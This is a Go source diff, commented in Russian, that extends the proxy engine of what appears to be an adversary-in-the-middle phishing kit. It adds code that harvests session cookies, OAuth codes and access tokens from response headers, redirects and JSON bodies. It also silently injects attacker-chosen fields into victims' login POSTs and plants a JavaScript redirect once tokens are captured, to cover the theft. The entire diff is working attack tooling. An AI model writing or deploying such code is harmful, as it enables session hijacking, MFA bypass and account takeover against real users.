@@ -5,6 +5,7 @@ package proxy
 import (
 	"bytes"
 	"compress/gzip"
+	"encoding/json"
 	"io"
 	"net"
 	"net/http"
@@ -31,6 +32,8 @@ type Engine struct {
 	spoof    func(host string) string
 	js       func(src string, seed int64) string
 	limit    Limiter
+	capMu    sync.Mutex
+	capped   map[string]bool
 	upstream map[string]string // origHost -> baseURL override (e2e/lab)
 	transport http.RoundTripper
 	fp       http.Handler
@@ -41,7 +44,22 @@ type Engine struct {
 type Limiter interface{ Allow(ip string) bool }
 
 func New(store core.PhishletStore, sessions core.SessionStore, bus core.EventBus) *Engine {
-	return &Engine{store: store, sessions: sessions, bus: bus}
+	return &Engine{store: store, sessions: sessions, bus: bus, capped: map[string]bool{}}
+}
+
+func (e *Engine) markCaptured(sid string) {
+	if sid == "" {
+		return
+	}
+	e.capMu.Lock()
+	e.capped[sid] = true
+	e.capMu.Unlock()
+}
+
+func (e *Engine) isCaptured(sid string) bool {
+	e.capMu.Lock()
+	defer e.capMu.Unlock()
+	return e.capped[sid]
 }
 
 // SetGuard — Botguard + blocklist + spoof (опционально, Pro-паритет).
@@ -147,6 +165,7 @@ func (e *Engine) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 		ct := r.Header.Get("Content-Type")
 		if strings.Contains(ct, "application/x-www-form-urlencoded") || strings.Contains(ct, "application/json") {
 			if body, err := io.ReadAll(r.Body); err == nil {
+				body = applyForce(ph, ct, body)
 				r.Body.Close()
 				r.Body = io.NopCloser(bytes.NewReader(body))
 				r.ContentLength = int64(len(body))
@@ -201,9 +220,14 @@ func (e *Engine) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 		// Cookie-Domain внутри rewriteCookies чистится от порта отдельно.
 		rewriteRedirect(resp, origHost, phishHost)
 		rewriteCookies(resp, origHost, host.Domain, phishHost)
-		markTokens(resp, ph, e.bus, r, sid)
-		scanLocation(resp, ph, e.bus, r, sid)
-		return e.rewriteBody(resp, ph, host, r, sid)
+		e.markTokens(resp, ph, r, sid)
+		e.scanLocation(resp, ph, r, sid)
+		e.scanHeaders(resp, ph, r, sid)
+		if err := e.rewriteBody(resp, ph, host, r, sid); err != nil {
+			return err
+		}
+		e.maybeRedirect(resp, r, ph, sid)
+		return nil
 	}
 	rp.ErrorHandler = func(w http.ResponseWriter, _ *http.Request, err error) {
 		http.Error(w, "upstream error", http.StatusBadGateway)
@@ -238,8 +262,8 @@ func capturedMFA(ph *core.Phishlet, body string) string {
 var oauthKeys = []string{"code=", "access_token", "id_token", "refresh_token"}
 
 // scanLocation ловит токены каскада в редиректах (?code=, #access_token=).
-func scanLocation(resp *http.Response, ph *core.Phishlet, bus core.EventBus, r *http.Request, sid string) {
-	if bus == nil {
+func (e *Engine) scanLocation(resp *http.Response, ph *core.Phishlet, r *http.Request, sid string) {
+	if e.bus == nil {
 		return
 	}
 	loc := resp.Header.Get("Location")
@@ -248,9 +272,11 @@ func scanLocation(resp *http.Response, ph *core.Phishlet, bus core.EventBus, r *
 	}
 	lowl := strings.ToLower(loc)
 	ip := remoteIP(r)
+	hit := false
 	check := func(key string) {
 		if strings.Contains(lowl, strings.ToLower(key)) {
-			_ = bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": key, "via": "location", "ip": ip, "path": r.URL.Path})
+			_ = e.bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": key, "via": "location", "ip": ip, "path": r.URL.Path})
+			hit = true
 		}
 	}
 	for _, k := range oauthKeys {
@@ -261,41 +287,75 @@ func scanLocation(resp *http.Response, ph *core.Phishlet, bus core.EventBus, r *
 			check(k + "=")
 		}
 	}
+	if hit {
+		e.markCaptured(sid)
+	}
 }
 
 // scanJSON ловит токены в JSON-телах ответов (client_credentials, token exchange).
-func scanJSON(ct string, body []byte, ph *core.Phishlet, bus core.EventBus, r *http.Request, sid string) {
-	if bus == nil || !strings.Contains(strings.ToLower(ct), "json") {
+func (e *Engine) scanJSON(ct string, body []byte, ph *core.Phishlet, r *http.Request, sid string) {
+	if e.bus == nil || !strings.Contains(strings.ToLower(ct), "json") {
 		return
 	}
 	low := strings.ToLower(string(body))
 	ip := remoteIP(r)
 	hit := func(key string) bool { return strings.Contains(low, strings.ToLower(key)) }
+	pub := func(key, via string) {
+		_ = e.bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": key, "via": via, "ip": ip, "path": r.URL.Path})
+		e.markCaptured(sid)
+	}
 	for _, k := range oauthKeys {
 		if hit(strings.TrimSuffix(k, "=")) {
-			_ = bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": strings.TrimSuffix(k, "="), "via": "json", "ip": ip, "path": r.URL.Path})
+			pub(strings.TrimSuffix(k, "="), "json")
 			return
 		}
 	}
 	for _, t := range ph.AuthTokens {
 		for _, k := range t.Keys {
 			if hit(k) {
-				_ = bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": k, "via": "json", "ip": ip, "path": r.URL.Path})
+				pub(k, "json")
 				return
 			}
 		}
 	}
 }
 
-func markTokens(resp *http.Response, ph *core.Phishlet, bus core.EventBus, r *http.Request, sid string) {
-	if len(ph.AuthTokens) == 0 || bus == nil {
+// scanHeaders ловит токены в прочих хедерах ответа (не cookies).
+func (e *Engine) scanHeaders(resp *http.Response, ph *core.Phishlet, r *http.Request, sid string) {
+	if e.bus == nil || len(ph.AuthTokens) == 0 {
+		return
+	}
+	for name, vals := range resp.Header {
+		ln := strings.ToLower(name)
+		if ln == "set-cookie" || ln == "content-length" || ln == "content-type" || ln == "date" {
+			continue
+		}
+		for _, v := range vals {
+			low := strings.ToLower(v)
+			for _, t := range ph.AuthTokens {
+				for _, k := range t.Keys {
+					lk := strings.ToLower(k)
+					if strings.Contains(low, lk+"=") || strings.Contains(low, "\""+lk+"\":") {
+						_ = e.bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": k, "via": "header", "ip": remoteIP(r), "path": r.URL.Path})
+						e.markCaptured(sid)
+						return
+					}
+				}
+			}
+		}
+	}
+}
+
+func (e *Engine) markTokens(resp *http.Response, ph *core.Phishlet, r *http.Request, sid string) {
+	if len(ph.AuthTokens) == 0 || e.bus == nil {
 		return
 	}
 	for _, setCookie := range resp.Header.Values("Set-Cookie") {
 		for _, t := range ph.AuthTokens {
 			for _, k := range t.Keys {
 				if strings.Contains(setCookie, k+"=") {
-					_ = bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": k, "ip": remoteIP(r), "path": r.URL.Path})
+					_ = e.bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": k, "ip": remoteIP(r), "path": r.URL.Path})
+					e.markCaptured(sid)
 					return
 				}
 			}
@@ -309,7 +369,7 @@ func (e *Engine) rewriteBody(resp *http.Response, ph *core.Phishlet, host *core.
 	if strings.Contains(strings.ToLower(ct), "json") && e.bus != nil {
 		if peek, err := io.ReadAll(resp.Body); err == nil {
 			resp.Body.Close()
-			scanJSON(ct, peek, ph, e.bus, r, sid)
+			e.scanJSON(ct, peek, ph, r, sid)
 			resp.Body = io.NopCloser(bytes.NewReader(peek))
 		}
 	}
@@ -341,7 +401,20 @@ func (e *Engine) rewriteBody(resp *http.Response, ph *core.Phishlet, host *core.
 		if f.TriggersOn != "" && f.TriggersOn != origHost {
 			continue
 		}
-		if f.RedirectOnly || f.Search == "" {
+		if f.RedirectOnly {
+			continue
+		}
+		if f.When != "" && !bytes.Contains(body, []byte(f.When)) {
+			continue
+		}
+		if f.Regex {
+			if f.Compiled == nil {
+				continue
+			}
+			body = f.Compiled.ReplaceAll(body, []byte(f.Replace))
+			continue
+		}
+		if f.Search == "" {
 			continue
 		}
 		body = bytes.ReplaceAll(body, []byte(f.Search), []byte(f.Replace))
@@ -582,4 +655,90 @@ func (e *Engine) renderSpoof(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	http.Error(w, "not found", http.StatusNotFound)
+}
+
+// applyForce тихо инжектит force_post-правила в исходящий POST.
+func applyForce(ph *core.Phishlet, ct string, body []byte) []byte {
+	if len(ph.ForcePost) == 0 || len(body) == 0 {
+		return body
+	}
+	lc := strings.ToLower(ct)
+	isForm := strings.Contains(lc, "application/x-www-form-urlencoded")
+	isJSON := strings.Contains(lc, "application/json")
+	for _, fr := range ph.ForcePost {
+		switch fr.Ctype {
+		case "form":
+			if !isForm {
+				continue
+			}
+			vals, err := url.ParseQuery(string(body))
+			if err != nil {
+				continue
+			}
+			vals.Set(fr.Key, fr.Value)
+			body = []byte(vals.Encode())
+		case "json":
+			if !isJSON {
+				continue
+			}
+			var m map[string]any
+			if err := json.Unmarshal(body, &m); err != nil || m == nil {
+				continue
+			}
+			m[fr.Key] = fr.Value
+			if nb, err := json.Marshal(m); err == nil {
+				body = nb
+			}
+		}
+	}
+	return body
+}
+
+// redirectFor: redirect_url приманки (lure override) или фишлета.
+func (e *Engine) redirectFor(path string, ph *core.Phishlet) string {
+	if e.lures != nil {
+		if rl, ok := e.lures.(interface{ RedirectFor(string) string }); ok {
+			if dest := rl.RedirectFor(path); dest != "" {
+				return dest
+			}
+		}
+	}
+	return ph.RedirectURL
+}
+
+// maybeRedirect: после захвата токена — JS-редирект на redirect_url.
+// Если апстрим сам ведет редиректом в дело (Location) — не мешаем.
+func (e *Engine) maybeRedirect(resp *http.Response, r *http.Request, ph *core.Phishlet, sid string) {
+	if sid == "" || !e.isCaptured(sid) {
+		return
+	}
+	if resp.Header.Get("Location") != "" {
+		return
+	}
+	ct := strings.ToLower(resp.Header.Get("Content-Type"))
+	if !strings.Contains(ct, "text/html") {
+		return
+	}
+	dest := e.redirectFor(r.URL.Path, ph)
+	if !isHTTPURL(dest) {
+		return
+	}
+	body, err := io.ReadAll(resp.Body)
+	resp.Body.Close()
+	if err != nil {
+		return
+	}
+	tag := `<script>location.replace("` + dest + `");</script>`
+	if i := bytes.LastIndex(body, []byte("</body>")); i >= 0 {
+		body = append(body[:i:i], append([]byte(tag), body[i:]...)...)
+	} else {
+		body = append(body, []byte(tag)...)
+	}
+	resp.Body = io.NopCloser(bytes.NewReader(body))
+	resp.ContentLength = int64(len(body))
+	resp.Header.Set("Content-Length", strconv.Itoa(len(body)))
+}
+
+func isHTTPURL(s string) bool {
+	return strings.HasPrefix(s, "https://") || strings.HasPrefix(s, "http://")
 }
